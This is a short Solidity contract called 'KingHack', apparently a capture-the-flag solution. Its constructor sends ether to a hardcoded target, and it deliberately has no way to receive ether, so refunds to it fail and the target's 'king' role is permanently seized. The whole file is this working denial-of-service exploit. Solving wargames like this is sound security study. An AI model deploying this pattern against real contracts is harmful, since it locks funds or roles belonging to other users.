// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract KingHack {
    
  // contract with no functions to receive ether. only way would be with SELFDESTRUCT
  address payable target;

  constructor() public payable {
    // immediately send receieve etherd to target contract upon receiving
    target = 0x40105fEA10a782B153E709bB7BeBbB30421B9Fe8;
    (bool sent, bytes memory data) = target.call{value: msg.value}("");
    require(sent, "Failed to send ether");
  }

}
